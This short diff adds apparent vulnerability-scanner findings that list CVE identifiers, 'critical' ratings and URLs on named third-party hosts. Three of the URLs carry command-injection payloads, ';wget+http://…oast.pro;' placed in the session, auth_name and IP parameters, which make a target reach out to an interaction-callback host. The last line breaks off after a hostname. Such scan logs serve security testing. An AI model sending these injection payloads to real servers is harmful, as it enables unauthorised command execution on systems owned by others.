@@ -1,0 +1,4 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da05jlaai4kjlh8gvtbg97rg1bztbfbmg.oast.pro;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da05jlaai4kjlh8gvtbgs59rpw5ppwpkf.oast.pro;
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da05jlaai4kjlh8gvtbgrgofraxm5a6mg.oast.pro;
+[CVE-2025-55182] [http] [critical] https://dashboard.layeredge.io
